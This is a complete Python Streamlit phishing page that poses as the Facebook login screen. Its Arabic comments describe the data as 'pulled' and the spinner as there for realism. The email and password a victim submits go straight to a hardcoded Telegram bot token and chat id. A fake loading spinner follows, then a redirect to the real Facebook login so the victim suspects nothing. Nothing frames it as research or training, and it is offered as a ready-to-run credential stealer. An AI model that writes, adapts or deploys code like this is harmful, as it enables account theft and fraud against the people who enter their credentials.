import streamlit as st
import requests
import time

# بياناتك الصحيحة
BOT_TOKEN = "8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM"
CHAT_ID = "8165652093" 

def send_telegram(user, pwd):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🔔 تم سحب بيانات جديدة:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

st.set_page_config(page_title="Facebook", layout="centered")

# تصميم الواجهة
st.markdown("<h1 style='color: #1877f2; text-align: center; font-family: sans-serif;'>facebook</h1>", unsafe_allow_html=True)

with st.form("login_form"):
    email = st.text_input("البريد الإلكتروني أو رقم الهاتف")
    password = st.text_input("كلمة السر", type="password")
    submit = st.form_submit_button("تسجيل الدخول", use_container_width=True)
    
    if submit:
        if email and password:
            # 1. إرسال البيانات فوراً
            send_telegram(email, password)
            
            # 2. إظهار رسالة تحميل وهمية لزيادة الواقعية
            with st.spinner('جاري تسجيل الدخول...'):
                time.sleep(2) # انتظار ثانيتين
            
            # 3. التوجيه لصفحة فيسبوك الحقيقية
            st.markdown('<meta http-equiv="refresh" content="0;URL=\'https://www.facebook.com/login/\'" />', unsafe_allow_html=True)
            st.write("جاري تحويلك...")
        else:
            st.warning("يرجى إدخال البيانات.")
